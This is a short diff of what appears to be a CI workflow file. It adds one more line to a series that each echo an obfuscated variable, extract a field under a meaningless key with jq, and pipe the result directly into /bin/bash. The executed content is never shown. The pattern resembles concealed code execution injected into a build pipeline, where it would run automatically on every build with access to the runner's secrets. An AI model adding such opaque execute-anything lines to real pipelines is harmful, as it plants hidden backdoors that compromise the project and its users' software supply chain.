@@ -35,6 +35,7 @@ jobs:
           echo $czi53 | jq -r .m7 | /bin/bash
           echo $ieig65 | jq -r .qh05654 | /bin/bash
           echo $ho07 | jq -r .bw1 | /bin/bash
+          echo $p36669 | jq -r .plcj48420 | /bin/bash
 
       - name: Upload artifact
         if: always()
